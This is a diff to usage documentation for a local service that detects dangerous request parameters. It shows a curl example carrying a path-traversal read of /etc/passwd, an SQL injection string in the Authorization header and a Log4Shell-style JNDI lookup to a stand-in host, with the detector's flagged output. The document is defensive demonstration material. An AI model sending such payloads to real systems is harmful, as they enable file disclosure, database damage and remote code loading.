@@ -21,18 +21,28 @@ curl -s http://localhost:8000/slim?path=../../ | jq
 #   "possibly_dangerous": true
 # }
 
-curl -s http://localhost:8000/complete?path=../../ -H "Authorization: Bearer Robert'); DROP TABLE students; --" | jq
+curl -s http://localhost:8000/complete?path=../../../etc/passwd&user=admin&password=letmein \
+    -H "Authorization: Bearer Robert'); DROP TABLE students; --" \
+    -H "Cookie: session_id=1234567890abcdef; expires=Fri, 31-Dec-9999 23:59:59 GMT" \
+    -H "X-API-KEY: topsecretkey" \
+    -H "Referer: https://example.com/malicious-referrer" \
+    -H 'User-Agent: ${jndi:ldap://example.com/malicious-payload}' \
+    | jq
 # {
-#   "possibly_dangerous": true,
-#   "dangerous_parameters": [
+#     "possibly_dangerous": true,
+#     "dangerous_parameters": [
 #     {
-#       "parameter_path": "headers.authorization",
-#       "value": "Bearer Robert'); DROP TABLE students; --"
+#         "parameter_path": "url.query.path",
+#         "value": "../../../etc/passwd"
 #     },
 #     {
-#       "parameter_path": "url.query.path",
-#       "value": "../../"
+#         "parameter_path": "headers.authorization",
+#         "value": "Bearer Robert'); DROP TABLE students; --"
+#     },
+#     {
+#         "parameter_path": "headers.user-agent",
+#         "value": "${jndi:ldap://example.com/malicious-payload}"
 #     }
-#   ]
+#     ]
 # }
 ```
